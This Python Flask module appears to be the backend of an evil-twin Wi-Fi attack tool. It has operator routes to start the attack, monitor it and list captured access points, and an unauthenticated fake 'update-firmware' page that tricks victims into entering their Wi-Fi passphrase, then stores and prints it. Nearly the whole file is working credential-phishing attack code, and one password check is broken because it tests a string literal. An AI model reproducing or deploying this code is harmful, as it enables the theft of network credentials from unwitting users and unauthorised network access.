import time
import json
import flask
import flask_login
from flask import Blueprint

from lib.resp import Resp
from lib.eviltwin.backend import EviltwinBackend
from lib.handshake.backend import HandshakeBackend
from lib.accesspoints.backend import AccesspointsBackend

eviltwin = Blueprint("eviltwin", __name__)

@eviltwin.route("/store-ap-info", methods=["POST"])
@flask_login.login_required
def store_ap_info():
    resp = Resp()
    form = flask.request.form

    if not ("bssid" in form and "essid" in form and "passphrase" in form):
        resp.msg = "This endpoint requires the bssid, essid, and the passphrase of the accesspoint"
        return flask.jsonify(resp.serialize)

    bssid = flask.escape(form.get("bssid")).strip()
    essid = flask.escape(form.get("essid")).strip()
    passphrase = flask.escape(form.get("passphrase")).strip()

    resp = EviltwinBackend.store_ap_info(bssid, essid, passphrase)
    return flask.jsonify(resp.serialize)


@eviltwin.route("/get-captured-aps", methods=["GET"])
@flask_login.login_required
def get_captured_aps():
    resp = EviltwinBackend.get_captured_aps()
    return flask.jsonify(resp.serialize)


@eviltwin.route("/remove-captured-ap", methods=["POST"])
@flask_login.login_required
def remove_captured_ap():
    resp = Resp()
    form = flask.request.form

    if not "bssid" in form:
        resp.msg = "This endpoint requires the bssid of the accesspoint"
        return flask.jsonify(resp.serialize)

    bssid = flask.escape(form.get("bssid")).strip()
    resp = EviltwinBackend.remove_captured_ap(bssid)
    return flask.jsonify(resp.serialize)


@eviltwin.route("/start-process", methods=["POST"])
@flask_login.login_required
def start_process():
    # Stop other processes
    HandshakeBackend.stop_process()
    AccesspointsBackend.stop_scan()
    time.sleep(2.5)

    resp = EviltwinBackend.start_evil_twin()
    return flask.jsonify(resp.serialize)


@eviltwin.route("/stop-process", methods=["POST"])
@flask_login.login_required
def stop_process():
    resp = EviltwinBackend.stop_evil_twin()
    return flask.jsonify(resp.serialize)


@eviltwin.route("/output-eviltwin", methods=["GET"])
@flask_login.login_required
def output_process():
    def stream():
        eviltwin = EviltwinBackend.status().value["eviltwin"]

        if not eviltwin:
            yield "data: finished\n\n"
            return

        if EviltwinBackend.status().value["eviltwin"]["isFound"]:
            yield "data: finished\n\n"
            return

        while True:
            eviltwin = EviltwinBackend.status().value["eviltwin"]

            if not eviltwin:
                break

            if eviltwin["isFound"]:
                break

            data = json.dumps(EviltwinBackend.eviltwin_monitor())
            yield f"data: {data}\n\n"

            time.sleep(0.5)

        yield "data: finished\n\n"

    return flask.Response(stream(), mimetype="text/event-stream")


@eviltwin.route("/status", methods=["GET"])
@flask_login.login_required
def status():
    resp = EviltwinBackend.status()
    return flask.jsonify(resp.serialize)


# --------------- Clients ------------ #


@eviltwin.route("/update-firmware", methods=["POST"])
def update_firmware():
    resp = Resp()

    if flask_login.current_user.is_authenticated:
        # Admin should not be able to view this page
        return flask.redirect(flask.url_for("admin.dashboard"))

    form = flask.request.form

    if not "password":
        resp.msg = "Password is required"
        return flask.jsonify(resp.serialize)

    resp.status = Resp.FAILED_CODE
    resp.msg = "Incorrect password, please try again!"

    passphrase = flask.escape(form.get("password")).strip()
    eviltwin = EviltwinBackend.eviltwin()

    if eviltwin and EviltwinBackend.verify_passphrase(passphrase):
        resp.msg = "Updating..."
        resp.status = Resp.SUCCESS_CODE

        EviltwinBackend.store_ap_info(
            bssid=eviltwin.bssid, essid=eviltwin.essid, passphrase=passphrase
        )

        eviltwin.is_found = True
        print(f"\nBssid: {eviltwin.bssid}\nEssid: {eviltwin.essid}\nPassphrase: {passphrase}\n")

    return flask.jsonify(resp.serialize)
